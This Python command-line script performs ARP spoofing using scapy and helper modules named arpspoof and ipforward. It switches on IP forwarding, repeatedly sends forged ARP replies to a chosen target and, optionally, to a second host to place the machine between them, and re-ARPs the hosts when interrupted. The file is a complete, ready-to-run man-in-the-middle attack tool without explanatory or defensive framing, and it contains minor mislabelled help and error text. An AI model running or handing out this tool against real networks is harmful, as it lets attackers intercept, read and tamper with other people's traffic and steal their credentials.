#!/usr/bin/env python3

'''Perform ARP Spoofing'''

import sys
from time import sleep
from argparse import ArgumentParser
from scapy.all import ARP
import arpspoof
import ipforward

parser = ArgumentParser(description='Perform ARP Spoofing', allow_abbrev=False)
parser.add_argument('-i', dest='interface', required=True, type=str, help='name of the interface')
parser.add_argument('-r', required=False, action='store_true', help='Poison both hosts (host and target)')
parser.add_argument('-t', dest='target', required=True, type=str, help='the target\'s IP address')
parser.add_argument('host', type=str, help='name of the interface')
args = parser.parse_args()

interface = args.interface
target_ip = args.target
host_ip = args.host
target_mac = arpspoof.get_mac_address(target_ip, interface)
host_mac = arpspoof.get_mac_address(host_ip, interface)
source_mac = ARP().hwsrc
ip_fwd = ipforward.chk_pkt_fwd_unix()

try:
    if target_mac is None:
        print('arpspoof: couldn\'t arp for host', host_ip)
        sys.exit()
    if args.r:
        if host_mac is None:
            print('arpspoof: couldn\'t arp for spoof host', host_ip)
            sys.exit()

    if not ip_fwd:
        ipforward.en_pkt_fwd_unix()

    while True:
        arpspoof.spoof_arp(target_ip, host_ip, target_mac, source_mac)
        if args.r:
            arpspoof.spoof_arp(host_ip, target_ip, host_mac, source_mac)
        sleep(3)    # Setting this to less causes problems with stop

except KeyboardInterrupt:

    print('Cleaning up and re-arping targets...')

    for i in range(5):
        arpspoof.clean_arp(target_ip, host_ip, target_mac, host_mac)
        if args.r:
            arpspoof.clean_arp(host_ip, target_ip, host_mac, target_mac)
        sleep(1)

    if not ip_fwd:
        ipforward.dis_pkt_fwd_unix()
